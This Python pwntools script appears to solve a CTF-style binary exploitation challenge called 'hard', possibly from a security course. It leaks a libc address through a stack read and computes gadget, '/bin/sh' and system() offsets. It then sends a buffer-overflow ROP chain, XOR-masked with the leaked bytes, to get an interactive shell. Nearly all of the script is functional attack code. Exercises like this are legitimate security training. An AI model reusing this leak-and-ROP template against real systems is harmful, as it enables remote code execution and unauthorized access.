#!/usr/bin/env python3
from pwn import *

# exe = ELF("./easy")
# exe = ELF("./medium")
# hard chall is dynamically linked, so here's helper
# patched version to load proper ld and libc
exe = ELF("./hard_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
index_number = b"438596"


def bxor(b1, b2):  # use xor for bytes
    result = b""
    for b1, b2 in zip(b1, b2):
        result += bytes([b1 ^ b2])
    return result


def send_config(r):
    r.sendline(index_number)
    r.sendline(b"2")


def send_init(r):
    r.sendline(b"8")
    r.sendline(8 * b"A")


def conn():
    r = process([exe.path, index_number])
    # r = remote("bsk.bonus.re", 13337)
    if args.GDB:
        gdb.attach(r)
    # send_config(r)

    dl = 14 * 8
    send_init(r)
    r.sendline(str(dl).encode())
    r.sendline(b"\0" * dl)
    for _ in range(5):
        __ = r.recvline()
    recv = r.recvn(dl)

    for _ in range(0, dl, 8):
        print(hex(u64(recv[_:_ + 8])))

    libc_off = u64(recv[(13 * 8):]) - 0x280D0
    pop_rdi_off = 0x28715
    ret_off = 0x28716
    binsh_off = 0x1c041b
    system_off = 0x55230

    print("libc=" + hex(libc_off))
    print("pop_rdi=" + hex(libc_off + pop_rdi_off))
    print("ret=" + hex(libc_off + ret_off))
    print("binsh=" + hex(libc_off + binsh_off))
    print("system=" + hex(libc_off + system_off))

    send_init(r)
    dl = 104
    r.sendline(str(dl).encode())
    payload = 72 * b"\0" + bxor(
        p64(libc_off + ret_off) +
        p64(libc_off + pop_rdi_off) +
        p64(libc_off + binsh_off) +
        p64(libc_off + system_off),
        recv[72: dl])
    r.sendline(payload)

    # for _ in range(5):
    #     __ = r.recvline()
    # recv = r.recvline()  # bytes for xor
    #
    # for _ in range(0, dl, 8):
    #     print(hex(u64(recv[_:_+8])))

    return r


def main():
    r = conn()
    # good luck!
    r.interactive()


if __name__ == "__main__":
    main()
